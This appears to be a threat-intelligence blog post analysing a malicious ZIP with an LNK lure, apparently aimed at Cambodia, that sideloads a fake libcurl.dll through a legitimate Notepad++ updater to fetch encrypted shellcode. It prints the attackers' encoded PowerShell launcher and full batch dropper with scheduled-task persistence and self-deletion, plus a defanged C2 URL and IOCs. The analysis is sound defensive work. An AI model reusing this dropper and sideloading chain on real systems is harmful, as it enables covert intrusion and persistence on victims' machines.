<!doctype html><html lang="en" data-mode="dark"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7"><meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" ><meta name="generator" content="Jekyll v4.4.1" /><meta property="og:title" content="Unattributed Shellcode Loader Likely Targeting Cambodia" /><meta property="og:locale" content="en" /><meta name="description" content="On March 20, 2025, MalwareHunterTeam shared a sample of a ZIP file containing an LNK, uploaded from Cambodia:" /><meta property="og:description" content="On March 20, 2025, MalwareHunterTeam shared a sample of a ZIP file containing an LNK, uploaded from Cambodia:" /><link rel="canonical" href="https://dmpdump.github.io/posts/Unattributed_Downloader_Cambodia/" /><meta property="og:url" content="https://dmpdump.github.io/posts/Unattributed_Downloader_Cambodia/" /><meta property="og:site_name" content="dmpdump" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2025-03-23T00:00:00+00:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Unattributed Shellcode Loader Likely Targeting Cambodia" /><meta name="twitter:site" content="@G60930953" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2025-03-23T12:08:06+00:00","datePublished":"2025-03-23T00:00:00+00:00","description":"On March 20, 2025, MalwareHunterTeam shared a sample of a ZIP file containing an LNK, uploaded from Cambodia:","headline":"Unattributed Shellcode Loader Likely Targeting Cambodia","mainEntityOfPage":{"@type":"WebPage","@id":"https://dmpdump.github.io/posts/Unattributed_Downloader_Cambodia/"},"url":"https://dmpdump.github.io/posts/Unattributed_Downloader_Cambodia/"}</script><title>Unattributed Shellcode Loader Likely Targeting Cambodia | dmpdump</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="dmpdump"><meta name="application-name" content="dmpdump"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.6.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.29.0/dist/tocbot.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox@3.3.0/dist/css/glightbox.min.css"><body><aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end"><header class="profile-wrapper"> <a href="/" id="avatar" class="rounded-circle"><img src="/assets/images/avatar.png" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a><h1 class="site-title"> <a href="/">dmpdump</a></h1><p class="site-subtitle fst-italic mb-0">CTI, RE, Programming</p></header><nav class="flex-column flex-grow-1 w-100 ps-0"><ul class="nav"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle"></i> <span>ABOUT</span> </a></ul></nav><div class="sidebar-bottom d-flex flex-wrap align-items-center w-100"> <a href="https://github.com/dmpdump" aria-label="github" target="_blank" rel="noopener noreferrer" > <i class="fab fa-github"></i> </a> <a href="https://twitter.com/G60930953" aria-label="twitter" target="_blank" rel="noopener noreferrer" > <i class="fa-brands fa-x-twitter"></i> </a> <a href="javascript:location.href = 'mailto:' + ['dmpdump','tuta.io'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></aside><div id="main-wrapper" class="d-flex justify-content-center"><div class="container d-flex flex-column px-xxl-5"><header id="topbar-wrapper" aria-label="Top Bar"><div id="topbar" class="d-flex align-items-center justify-content-between px-lg-3 h-100" ><nav id="breadcrumb" aria-label="Breadcrumb"> <span> <a href="/">Home</a> </span> <span>Unattributed Shellcode Loader Likely Targeting Cambodia</span></nav><button type="button" id="sidebar-trigger" class="btn btn-link"> <i class="fas fa-bars fa-fw"></i> </button><div id="topbar-title"> Post</div><button type="button" id="search-trigger" class="btn btn-link"> <i class="fas fa-search fa-fw"></i> </button> <search id="search" class="align-items-center ms-3 ms-lg-0"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..." > </search> <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button></div></header><div class="row flex-grow-1"><main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4"><article class="px-1"><header><h1 data-toc-skip>Unattributed Shellcode Loader Likely Targeting Cambodia</h1><div class="post-meta text-muted"> <span> Posted <time data-ts="1742688000" data-df="ll" data-bs-toggle="tooltip" data-bs-placement="bottom" > Mar 23, 2025 </time> </span> <span> Updated <time data-ts="1742731686" data-df="ll" data-bs-toggle="tooltip" data-bs-placement="bottom" > Mar 23, 2025 </time> </span><div class="d-flex justify-content-between"> <span> By <em> <a href="https://github.com/dmpdump">dmpdump</a> </em> </span><div> <span class="readtime" data-bs-toggle="tooltip" data-bs-placement="bottom" title="917 words" > <em>5 min</em> read</span></div></div></div></header><div class="content"><p>On March 20, 2025, <a href="https://x.com/malwrhunterteam/status/1902710467341980017">MalwareHunterTeam</a> shared a sample of a ZIP file containing an LNK, uploaded from Cambodia:</p><p><a href="/assets/images/shellcode_cambodia/mht.png" class="popup img-link shimmer"><img src="/assets/images/shellcode_cambodia/mht.png" alt="sshot" loading="lazy"></a></p><p>The ZIP file is named <code class="language-plaintext highlighter-rouge">CNP_MFA_Meeting_Documents.zip</code>. It contains an LNK file named <code class="language-plaintext highlighter-rouge">Meeting_Staff_List.lnk</code> and a hidden folder named <code class="language-plaintext highlighter-rouge">Resources</code>. This folder contains a ZIP file named <code class="language-plaintext highlighter-rouge">Resources.zip</code> and a batch file named <code class="language-plaintext highlighter-rouge">R.bat</code></p><p><a href="/assets/images/shellcode_cambodia/zip1.png" class="popup img-link shimmer"><img src="/assets/images/shellcode_cambodia/zip1.png" alt="sshot" loading="lazy"></a></p><p><a href="/assets/images/shellcode_cambodia/zip2.png" class="popup img-link shimmer"><img src="/assets/images/shellcode_cambodia/zip2.png" alt="sshot" loading="lazy"></a></p><p><code class="language-plaintext highlighter-rouge">Resources.zip</code> contains the files that are used for the next-stage payload download:</p><p><a href="/assets/images/shellcode_cambodia/zip3.png" class="popup img-link shimmer"><img src="/assets/images/shellcode_cambodia/zip3.png" alt="sshot" loading="lazy"></a></p><h1 id="infection-chain">Infection chain</h1><p>When <code class="language-plaintext highlighter-rouge">Meeting_Staff_List.lnk</code> is executed, it runs a hidden/base64-encoded PowerShell script:</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="w"> </span><span class="n">/c</span><span class="w"> </span><span class="nx">pOweRsHeLl.eXe</span><span class="w"> </span><span class="nt">-w</span><span class="w"> </span><span class="nx">1</span><span class="w"> </span><span class="nt">-e</span><span class="w"> </span><span class="nx">dABhAHIAIAAtAHgAZgAgACIAQwBOAFAAXwBNAEYAQQBfAE0AZQBlAHQAaQBuAGcAXwBEAG8AYwB1AG0AZQBuAHQAcwAuAHoAaQBwACIAOwAgACYAIAAiAFIAZQBzAG8AdQByAGMAZQBzAFwAUgAuAGIAYQB0ACIA</span><span class="w">
</span></pre></table></code></div></div><p>The decoded scripts shows that the LNK simply extracts the contents of the ZIP file and runs <code class="language-plaintext highlighter-rouge">R.bat</code>.</p><div class="language-batch highlighter-rouge"><div class="code-header"> <span data-label-text="Batch"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="kd">tar</span> <span class="na">-xf </span><span class="s2">"CNP_MFA_Meeting_Documents.zip"</span><span class="o">;</span> <span class="o">&amp;</span> <span class="s2">"Resources\R.bat"</span>
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">R.bat</code> is a simple batch script that was very likely generated with an LLM. The excessive presence of comments in the code is typically a good indicator of LLM-generated code. This batch script performs the following actions:</p><ul><li>Tries to extract the contents of <code class="language-plaintext highlighter-rouge">Resources.zip</code> to a newly-created folder <code class="language-plaintext highlighter-rouge">Notepad++</code> under %AppData% using PowerShell<li>If the PowerShell attempt fails, it downloads 7-zip and attempts to extract the contents of <code class="language-plaintext highlighter-rouge">Resources.zip</code> with it<li>Runs <code class="language-plaintext highlighter-rouge">Notepad++.exe</code><li>Creates a Scheduled Task named <code class="language-plaintext highlighter-rouge">Notepad++</code> to run every 15 minutes. The Scheduled Task runs <code class="language-plaintext highlighter-rouge">Notepad++.exe</code><li>Deletes <code class="language-plaintext highlighter-rouge">Resources.zip</code> and <code class="language-plaintext highlighter-rouge">R.bat</code></ul><div class="language-batch highlighter-rouge"><div class="code-header"> <span data-label-text="Batch"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
</pre><td class="rouge-code"><pre>@echo <span class="na">off</span>
<span class="nb">setlocal</span>

<span class="kd">set</span> <span class="kd">ResourceZip</span><span class="o">=</span><span class="vm">%~dp0</span><span class="kd">Resources</span>.zip

<span class="c">:: Destination resources path </span>
<span class="kd">set</span> <span class="kd">DropPath</span><span class="o">=</span><span class="nv">%AppData%</span>\Notepad<span class="o">++</span>

<span class="nb">mkdir</span> <span class="nv">%DropPath%</span>

<span class="kd">set</span> <span class="kd">ExecutableFile</span><span class="o">=</span><span class="nv">%DropPath%</span>\Notepad<span class="o">++</span>.exe

<span class="c">:: Extract resources</span>
<span class="kd">powershell</span> <span class="na">-nop -ep </span><span class="kd">bypass</span> <span class="na">-w </span><span class="m">1</span> <span class="na">-command </span><span class="s2">"Expand-Archive -Path '</span><span class="nv">%ResourceZip%</span><span class="s2">' -DestinationPath '</span><span class="nv">%DropPath%</span><span class="s2">' -Force"</span>

<span class="c">:: If extract failed --&gt; Install 7zip (mostly on Windows 7)</span>
<span class="k">if</span> <span class="ow">errorlevel</span> <span class="m">1</span> <span class="o">(</span>
    :: <span class="kd">Define</span> <span class="kd">the</span> <span class="kd">URL</span> <span class="kd">and</span> <span class="kd">the</span> <span class="kd">output</span> <span class="kd">file</span> <span class="kd">name</span>
    <span class="kd">set</span> <span class="s2">"url=https://www.7-zip.org/a/7z2409-x64.exe"</span>
    <span class="kd">set</span> <span class="s2">"output=7z2409-x64.exe"</span>

    :: <span class="kd">Use</span> <span class="kd">PowerShell</span> <span class="kd">to</span> <span class="kd">download</span> <span class="kd">the</span> <span class="kd">file</span>
    <span class="kd">powershell</span> <span class="na">-w </span><span class="kd">hidden</span> <span class="na">-nop -ep </span><span class="kd">bypass</span> <span class="na">-Command </span><span class="s2">"Invoke-WebRequest -Uri '</span><span class="nv">%url%</span><span class="s2">' -OutFile '</span><span class="nv">%output%</span><span class="s2">'"</span>

    :: <span class="kd">Check</span> <span class="k">if</span> <span class="kd">the</span> <span class="kd">download</span> <span class="kd">was</span> <span class="kd">successful</span>
    <span class="k">if</span> <span class="ow">exist</span> <span class="s2">"</span><span class="nv">%output%</span><span class="s2">"</span> <span class="o">(</span>
        :: <span class="kd">Run</span> <span class="kd">the</span> <span class="kd">installer</span> <span class="kd">silently</span>
        <span class="s2">"</span><span class="nv">%output%</span><span class="s2">"</span> <span class="na">/S
    </span><span class="o">)</span> <span class="k">else</span> <span class="o">(</span>
        <span class="k">exit</span> <span class="na">/b </span><span class="m">1</span>
    <span class="o">)</span>

    :: <span class="kd">Check</span> <span class="k">if</span> <span class="kd">the</span> <span class="kd">ZIP</span> <span class="kd">file</span> <span class="kd">exists</span> <span class="kd">and</span> <span class="nb">extract</span> <span class="kd">it</span> <span class="kd">using</span> <span class="m">7</span><span class="na">-Zip
    </span><span class="k">if</span> <span class="ow">exist</span> <span class="s2">"</span><span class="nv">%ResourceZip%</span><span class="s2">"</span> <span class="o">(</span>
        :: <span class="kd">Use</span> <span class="m">7</span><span class="na">-Zip </span><span class="kd">to</span> <span class="nb">extract</span> <span class="kd">the</span> <span class="kd">ZIP</span> <span class="kd">file</span>
        <span class="kd">C</span>:\PROGRA<span class="o">~</span><span class="m">1</span>\7<span class="na">-Zip</span>\7z.exe <span class="kd">x</span> <span class="s2">"</span><span class="nv">%ResourceZip%</span><span class="s2">"</span> <span class="na">-o</span><span class="s2">"</span><span class="nv">%DropPath%</span><span class="s2">"</span> <span class="na">-y
        </span><span class="k">if</span> <span class="ow">errorlevel</span> <span class="m">1</span> <span class="o">(</span>
            <span class="kd">C</span>:\PROGRA<span class="o">~</span><span class="m">2</span>\7<span class="na">-Zip</span>\7z.exe <span class="kd">x</span> <span class="s2">"</span><span class="nv">%ResourceZip%</span><span class="s2">"</span> <span class="na">-o</span><span class="s2">"</span><span class="nv">%DropPath%</span><span class="s2">"</span> <span class="na">-y
            </span><span class="k">exit</span> <span class="na">/b </span><span class="m">1</span>
        <span class="o">)</span>
    <span class="o">)</span> <span class="k">else</span> <span class="o">(</span>
        <span class="k">exit</span> <span class="na">/b </span><span class="m">1</span>
    <span class="o">)</span>

    :: <span class="kd">Clean</span> <span class="kd">up</span>
    <span class="nb">del</span> <span class="s2">"</span><span class="nv">%output%</span><span class="s2">"</span>
<span class="o">)</span>

<span class="c">:: Run the executable</span>
<span class="k">if</span> <span class="ow">exist</span> <span class="s2">"</span><span class="nv">%ExecutableFile%</span><span class="s2">"</span> <span class="o">(</span>
    <span class="nb">start</span> <span class="s2">""</span> <span class="s2">"</span><span class="nv">%ExecutableFile%</span><span class="s2">"</span>
<span class="o">)</span> <span class="k">else</span> <span class="o">(</span>
    <span class="k">exit</span> <span class="na">/b </span><span class="m">1</span>
<span class="o">)</span>

<span class="c">:: Define the task name and the command to run</span>
<span class="kd">set</span> <span class="kd">taskName</span><span class="o">=</span><span class="s2">"Notepad++"</span>
<span class="kd">set</span> <span class="kd">taskCommand</span><span class="o">=</span><span class="nv">%APPDATA%</span>\Notepad<span class="o">++</span>\Notepad<span class="o">++</span>.exe  

<span class="c">:: Create the scheduled task</span>
<span class="nb">schtasks</span> <span class="na">/create /tn </span><span class="s2">"</span><span class="nv">%taskName%</span><span class="s2">"</span> <span class="na">/tr </span><span class="s2">"</span><span class="nv">%taskCommand%</span><span class="s2">"</span> <span class="na">/sc </span><span class="kd">minute</span> <span class="na">/mo </span><span class="m">15</span> <span class="na">/st </span><span class="m">06</span>:00:00 <span class="na">/f

</span><span class="c">:: Remove self</span>
<span class="nb">del</span> <span class="na">/s /a /q /f </span><span class="nv">%ResourceZip%</span>
<span class="nb">del</span> <span class="na">/s /a /q /f </span><span class="kd">R</span>.bat

<span class="nb">endlocal</span>
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">Notepad++.exe</code> is a legitimate version of WinGup for NotePad++. This executable loads the <code class="language-plaintext highlighter-rouge">libcurl.dll</code>. The threat actor delivered a malicious DLL for DLL Hijacking purposes.</p><p><a href="/assets/images/shellcode_cambodia/notepimport.png" class="popup img-link shimmer"><img src="/assets/images/shellcode_cambodia/notepimport.png" alt="sshot" loading="lazy"></a></p><p>The malicious logic in this infection chain is implemented in <code class="language-plaintext highlighter-rouge">libcurl.dll</code>, loaded and executed in the memory of <code class="language-plaintext highlighter-rouge">Notepad++.exe</code>. Out of the 4 functions exported by this DLL, only <code class="language-plaintext highlighter-rouge">curl_easy_init</code> implements some functionality. The DLL strings are decrypted with a simple XOR algorithm using a rolling key. The following Python script can be used to decrypt strings:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
    <span class="n">data</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">.</span><span class="nf">fromhex</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
    <span class="n">result</span> <span class="o">=</span> <span class="nf">bytearray</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
    <span class="n">xor_key</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0xAA</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">]</span>
    
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">result</span><span class="p">)):</span>
        <span class="n">result</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^=</span> <span class="n">xor_key</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="mi">2</span><span class="p">]</span>
    
    <span class="k">return</span> <span class="n">result</span><span class="p">.</span><span class="nf">decode</span><span class="p">(</span><span class="sh">'</span><span class="s">ascii</span><span class="sh">'</span><span class="p">)</span>

<span class="n">encrypted_str</span> <span class="o">=</span> <span class="sh">"</span><span class="s">C221DE25D96F857AC63CDC308430CB26</span><span class="sh">"</span> <span class="c1">#sample encrypted string from the DLL
</span><span class="n">decrypted</span> <span class="o">=</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">encrypted_str</span><span class="p">)</span>
<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Decrypted String:</span><span class="sh">"</span><span class="p">,</span> <span class="n">decrypted</span><span class="p">)</span>
</pre></table></code></div></div><p>When the DLL is loaded and <code class="language-plaintext highlighter-rouge">curl_easy_init</code> is called, a new thread is created that performs the following actions:</p><ul><li>First, it decrytps the string <code class="language-plaintext highlighter-rouge">curl.dll</code> and uses it to load the library, which is also delivered in the ZIP archive</ul><p><a href="/assets/images/shellcode_cambodia/curldecrypt.png" class="popup img-link shimmer"><img src="/assets/images/shellcode_cambodia/curldecrypt.png" alt="sshot" loading="lazy"></a></p><ul><li>Then, it decrypts strings for curl.dll’s exported functions <code class="language-plaintext highlighter-rouge">checkper</code> and <code class="language-plaintext highlighter-rouge">setper</code>. First it calls the <code class="language-plaintext highlighter-rouge">checkper</code> function. If it returns false, it calls <code class="language-plaintext highlighter-rouge">setper</code>.</ul><p><a href="/assets/images/shellcode_cambodia/export_dec.png" class="popup img-link shimmer"><img src="/assets/images/shellcode_cambodia/export_dec.png" alt="sshot" loading="lazy"></a></p><p>Reviewing the loaded <code class="language-plaintext highlighter-rouge">curl.dll</code>, we can see that this is not related to curl. This DLL implements two functions to check and establish persistence via the registry run key - “checkper” stands for “check persistence”, and “setper” stands for “set persistence”. The value used for persistence is <code class="language-plaintext highlighter-rouge">WinGup</code>.</p><p><a href="/assets/images/shellcode_cambodia/checkper.png" class="popup img-link shimmer"><img src="/assets/images/shellcode_cambodia/checkper.png" alt="sshot" loading="lazy"></a></p><p><a href="/assets/images/shellcode_cambodia/setper.png" class="popup img-link shimmer"><img src="/assets/images/shellcode_cambodia/setper.png" alt="sshot" loading="lazy"></a></p><ul><li>Next, it deletes <code class="language-plaintext highlighter-rouge">curl.dll</code> and decrypts the following URL: <code class="language-plaintext highlighter-rouge">https://live.easyboxsync[.]com/resources/gup/notepad</code></ul><p><a href="/assets/images/shellcode_cambodia/del_curl_dec_url.png" class="popup img-link shimmer"><img src="/assets/images/shellcode_cambodia/del_curl_dec_url.png" alt="sshot" loading="lazy"></a></p><ul><li>The DLL then performs the following actions:<ul><li>Decrypts a 16 byte key: <code class="language-plaintext highlighter-rouge">oKqlpfBc5dkGuYi8</code><li>Downloads a shellcode from the decrypted URL using the <code class="language-plaintext highlighter-rouge">downloader</code> User-Agent string<li>Decrypts the shellcode using AES (likely AES-128 given the key length) using the Crypto++ library<li>Loads the shellcode</ul></ul><p><a href="/assets/images/shellcode_cambodia/down_sc.png" class="popup img-link shimmer"><img src="/assets/images/shellcode_cambodia/down_sc.png" alt="sshot" loading="lazy"></a></p><p><a href="/assets/images/shellcode_cambodia/uas.png" class="popup img-link shimmer"><img src="/assets/images/shellcode_cambodia/uas.png" alt="sshot" loading="lazy"></a></p><p>Unfortunately, as of this writing, I have not been able to obtain the next-stage encrypted shellcode to continue the analysis. Various elements of the infection chain suggest that this is targeted activity, including the lures, the techniques, and the attempts to clean up traces. The Virus Total upload dates and the likely compilation times suggest that this recent activity, with <code class="language-plaintext highlighter-rouge">libcurl.dll</code> and <code class="language-plaintext highlighter-rouge">curl.dll</code> having close timestamps.</p><p><code class="language-plaintext highlighter-rouge">libcurl.dll</code> metadata:</p><p><a href="/assets/images/shellcode_cambodia/libcurl_time.png" class="popup img-link shimmer"><img src="/assets/images/shellcode_cambodia/libcurl_time.png" alt="sshot" loading="lazy"></a></p><p><code class="language-plaintext highlighter-rouge">curl.dll</code> metadata:</p><p><a href="/assets/images/shellcode_cambodia/curl_time.png" class="popup img-link shimmer"><img src="/assets/images/shellcode_cambodia/curl_time.png" alt="sshot" loading="lazy"></a></p><p>While we don’t have a PDB path from the <code class="language-plaintext highlighter-rouge">libcurl.dll</code>, we can still get a path from the use of the Crypto++ libraries in the development environment:</p><p><a href="/assets/images/shellcode_cambodia/pdb.png" class="popup img-link shimmer"><img src="/assets/images/shellcode_cambodia/pdb.png" alt="sshot" loading="lazy"></a></p><p><code class="language-plaintext highlighter-rouge">easyboxsync[.]com</code> is hosted in Cloudflare:</p><p><a href="/assets/images/shellcode_cambodia/dns.png" class="popup img-link shimmer"><img src="/assets/images/shellcode_cambodia/dns.png" alt="sshot" loading="lazy"></a></p><p>This domain used for the payload download is relatively recent:</p><p><a href="/assets/images/shellcode_cambodia/domain.png" class="popup img-link shimmer"><img src="/assets/images/shellcode_cambodia/domain.png" alt="sshot" loading="lazy"></a></p><h1 id="iocs">IOCs</h1><ul><li>Domain: https://live.easyboxsync[.]com/resources/gup/notepad<li>CNP_MFA_Meeting_Documents.zip: a2c128fc040ed2db7634134f0577b3267164b71f692fc9b37c08e48b168d89e6<li>Meeting_Staff_List.lnk: 7e0da1399ff99e41493db489159668db566b6b00cd367e770619b774ec515809<li>Resources.zip: badd970fab64c072e5ab0a81865de0988c1b12165a076bcdbee8a9cb8e101675<li>R.bat: 28ff75c0ac4434cdc4f0b21567ac1f06979c2426f8623d157473ac079bf8792a<li>Notepad++.exe: 1f8c7a202ac9f64efbedb420b6160ef4f9852f6ff1aa36abaa64bfb76b142e15<li>libcurl.dll: 23d76c49128994d83f878fd08829d003c2ffcd063d03ec7ff1fe4fe41ffb36c3<li>curl.dll: 2707ba2dc931da049f70c31b0654714121fac908475dc084cb4ab808f9dd5308</ul></div><div class="post-tail-wrapper text-muted"><div class="post-tags"> <i class="fa fa-tags fa-fw me-1"></i> <a href="/tags/cti/" class="post-tag no-text-decoration" >cti</a> <a href="/tags/malware/" class="post-tag no-text-decoration" >malware</a></div><div class=" post-tail-bottom d-flex justify-content-between align-items-center mt-5 pb-2 " ><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper d-flex align-items-center"> <span class="share-label text-muted">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Unattributed%20Shellcode%20Loader%20Likely%20Targeting%20Cambodia%20-%20dmpdump&url=https%3A%2F%2Fdmpdump.github.io%2Fposts%2FUnattributed_Downloader_Cambodia%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter"> <i class="fa-fw fa-brands fa-square-x-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Unattributed%20Shellcode%20Loader%20Likely%20Targeting%20Cambodia%20-%20dmpdump&u=https%3A%2F%2Fdmpdump.github.io%2Fposts%2FUnattributed_Downloader_Cambodia%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fdmpdump.github.io%2Fposts%2FUnattributed_Downloader_Cambodia%2F&text=Unattributed%20Shellcode%20Loader%20Likely%20Targeting%20Cambodia%20-%20dmpdump" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <button id="copy-link" aria-label="Copy link" class="btn small" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy link" data-title-succeed="Link copied successfully!" > <i class="fa-fw fas fa-link pe-none fs-6"></i> </button> </span></div></div></div></article></main><aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 mb-5 text-muted"><div class="access"><section id="access-lastmod"><h2 class="panel-heading">Recently Updated</h2><ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2"><li class="text-truncate lh-lg"> <a href="/posts/Unattributed_Downloader_Cambodia/">Unattributed Shellcode Loader Likely Targeting Cambodia</a><li class="text-truncate lh-lg"> <a href="/posts/Kivars/">China-nexus Kivars Backdoor Uploaded from Taiwan</a><li class="text-truncate lh-lg"> <a href="/posts/Lazarus-Backdoor-ITLure/">Lazarus Backdoor with IT Lure</a><li class="text-truncate lh-lg"> <a href="/posts/PUBLOAD_GrimResource/">PUBLOAD Likely Delivered to Thailand via GrimResource MSC</a><li class="text-truncate lh-lg"> <a href="/posts/Havoc/">Targeted Campaign Delivering Havoc</a></ul></section><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/tags/malware/">malware</a> <a class="post-tag btn btn-outline-primary" href="/tags/cti/">cti</a> <a class="post-tag btn btn-outline-primary" href="/tags/apt/">apt</a> <a class="post-tag btn btn-outline-primary" href="/tags/chrome/">chrome</a> <a class="post-tag btn btn-outline-primary" href="/tags/re/">RE</a> <a class="post-tag btn btn-outline-primary" href="/tags/china/">china</a> <a class="post-tag btn btn-outline-primary" href="/tags/cn/">cn</a> <a class="post-tag btn btn-outline-primary" href="/tags/cti/">CTI</a> <a class="post-tag btn btn-outline-primary" href="/tags/dprk/">dprk</a> <a class="post-tag btn btn-outline-primary" href="/tags/golang/">golang</a></div></section></div></aside></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4"><aside id="related-posts" aria-labelledby="related-label"><h3 class="mb-4" id="related-label">Further Reading</h3><nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4"><article class="col"> <a href="/posts/Lazarus-Backdoor-ITLure/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1739059200" data-df="ll" > Feb 9, 2025 </time><h4 class="pt-0 my-2">Lazarus Backdoor with IT Lure</h4><div class="text-muted"><p>On January 27, 2025, @smica83 shared a sample on X indicating that it looked like Lazarus malware. I reviewed the sample and concluded that, indeed, it is a North Korean backdoor, likely the latest...</p></div></div></a></article><article class="col"> <a href="/posts/Kivars/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1740355200" data-df="ll" > Feb 24, 2025 </time><h4 class="pt-0 my-2">China-nexus Kivars Backdoor Uploaded from Taiwan</h4><div class="text-muted"><p>On February 22, 2025, MalwareHunterTeam shared a DLL uploaded from Taiwan with hash 1286aa5c73cf2c8058c52271869a5727d71ca5bd4dd0854be970d2a25cb52bf8 The DLL was uploaded from Taiwan on February ...</p></div></div></a></article><article class="col"> <a href="/posts/Havoc/" class="post-preview card h-100"><div class="card-body"> 